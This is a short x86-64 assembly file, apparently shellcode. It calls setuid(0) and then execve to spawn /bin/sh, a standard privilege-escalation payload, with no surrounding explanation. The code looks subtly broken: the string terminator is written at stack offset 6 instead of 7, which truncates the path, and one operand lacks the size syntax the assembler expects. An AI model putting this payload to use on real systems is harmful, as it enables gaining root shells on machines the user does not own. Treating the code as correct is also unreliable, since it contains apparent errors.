.global _start
_start:
.intel_syntax noprefix
	mov al, 105
	xor edi, edi
	syscall
	xor rax, rax
	mov rbx, 0xff68732f6e69622f
	push rbx
	mov byte [rsp + 0x06], al	# /bin/sh
	mov al, 59
	mov rdi, rsp	
	xor esi, esi
	xor edx, edx
	syscall

